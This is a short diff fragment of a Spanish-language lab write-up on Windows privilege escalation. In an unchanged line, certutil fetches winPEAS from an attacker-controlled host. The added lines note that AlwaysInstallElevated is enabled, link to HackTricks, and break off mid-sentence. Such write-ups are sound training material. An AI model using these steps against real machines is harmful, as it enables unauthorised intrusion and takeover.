@@ -102,3 +102,8 @@ certutil.exe -f -urlcache -split http://10.10.14.79/winPEASx64.exe
 ```
 
 Una vez en la maquina lo ejecutaremos, en la salida obtenida observamos
+
+Encontramos `AlwaysInstallElevated` el cual esta seteado en `1` tanto en el `HKLM` y `HKCU`, nos podemos aprovechar de ellos para elevar privilegios
+[https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html?highlight=AlwaysInstallElevated#alwaysinstallelevated]
+
+Lo que nos permite tener estos dos registros acticvad
